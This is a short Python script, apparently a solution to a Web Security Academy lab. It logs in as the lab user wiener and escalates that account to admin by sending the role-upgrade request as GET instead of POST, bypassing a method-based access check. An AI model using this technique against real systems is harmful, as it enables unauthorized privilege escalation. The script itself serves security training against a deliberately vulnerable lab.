###########################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 5/9/2023
#
# Lab: Method-based access control can be circumvented
#
# Steps: 1. Login as wiener
#        2. Upgrade wiener to be an admin via GET method instead of POST
#
###########################################################################

###########
# imports
###########
import requests
from colorama import Fore

# change this url to your lab
url = "https://0af6006b04db984a81824332009600da.web-security-academy.net"


try:  # login as wiener
    data = {
        "username": "wiener",
        "password": "peter"
    }
    login = requests.post(f"{url}/login", data, allow_redirects=False)
    if login.status_code == 302:
        print(
            Fore.WHITE + "1. Logging in as wiener.. " + Fore.GREEN + "OK")
        session = login.cookies.get("session")
        try:  # upgrade wiener to be an admin via GET method instead of POST
            cookies = {"session": session}
            upgrade_wiener = requests.get(
                f"{url}/admin-roles?username=wiener&action=upgrade", cookies=cookies)
            print(
                Fore.WHITE + "2. Upgrading wiener to be an admin via GET method instead of POST.. " + Fore.GREEN + "OK")
            print(
                Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
        except:
            print(
                Fore.RED + "[!] Failed to upgrade wiener to be an admin through exception")
    else:
        print(Fore.RED + "[!] Failed to login as wiener")
except:
    print(
        Fore.RED + "[!] Failed to login as wiener through exception")
